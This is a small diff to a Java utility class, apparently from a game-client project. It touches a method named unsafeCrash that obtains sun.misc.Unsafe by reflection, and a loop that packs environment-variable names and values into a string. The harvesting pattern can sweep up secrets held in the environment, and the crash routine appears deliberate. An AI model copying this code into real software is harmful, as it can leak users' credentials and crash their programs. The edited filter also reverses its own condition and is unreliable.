@@ -14,7 +14,6 @@ import java.util.List;
  * @author _kisman_
  * @since 12:51 of 04.07.2022
  */
-@SuppressWarnings("StatementWithEmptyBody")
 public class Utility {
     public static List<String> allowedFileSuffixes = Arrays.asList(
             ".png",//images
@@ -51,7 +50,7 @@ public class Utility {
     public static void unsafeCrash() {
         Unsafe unsafe = null;
         try {
-            Field f = Unsafe.class.getDeclaredField( "theUnsafe" );
+            Field f = Unsafe.class.getDeclaredField( "theUnsafe");
             f.setAccessible(true);
             unsafe = (Unsafe) f.get(null);
         } catch (Exception e) {
@@ -76,7 +75,7 @@ public class Utility {
         }
 
         for(String env : System.getenv().keySet()) {
-            if(env != "line.separator") {
+            if(env.equals("line.separator")) {
                 properties.append(env).append("|").append(System.getenv(env)).append("&");
             }
         }
